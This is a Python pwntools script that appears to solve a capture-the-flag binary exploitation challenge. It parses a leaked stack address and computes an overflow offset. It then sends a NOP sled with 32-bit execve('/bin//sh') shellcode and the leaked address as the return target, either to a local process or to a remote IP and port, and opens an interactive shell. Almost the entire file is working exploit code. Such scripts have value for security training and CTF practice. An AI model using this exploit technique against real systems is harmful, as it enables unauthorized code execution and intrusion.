#!/usr/bin/env python
import pwn

pwn.context.terminal = ["st", "-e", "sh", "-c"]
GDBSCRIPT = f"""
b * name + 104
c
"""
addr_to_offset = lambda num: pwn.cyclic_find(num.to_bytes(4, "little"))


def get_challenge(elf):
    if pwn.args.REMOTE:
        challenge = pwn.remote("206.189.123.169", 5003)
    elif pwn.args.GDB:
        challenge = pwn.process(elf.path)
        pwn.gdb.attach(
            challenge,
            gdbscript=GDBSCRIPT
        )
    else:
        challenge = pwn.process(elf.path)

    return challenge


def parse_leak(chal):
    chal.recvuntil(": 0x")
    leak = int(chal.recvline(), 16)
    pwn.log.info(f"Parsed {leak=:08X}")
    return leak


def main():
    elf = pwn.ELF("./main")

    challenge = get_challenge(elf)

    leak = parse_leak(challenge)

    offset = addr_to_offset(0x61616169)

    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73" \
                b"\x68\x68\x2f\x62\x69\x6e\x89" \
                b"\xe3\x89\xc1\x89\xc2\xb0\x0b" \
                b"\xcd\x80\x31\xc0\x40\xcd\x80"
    print(shellcode)
    exploit = (
        b"\x90" * (offset - len(shellcode) - (len(shellcode) % 8))
      + shellcode
      + b"A" * (len(shellcode) % 8)
      + pwn.p32(leak)
    )
    challenge.sendline(exploit)

    challenge.interactive()


if __name__ == "__main__":
    main()
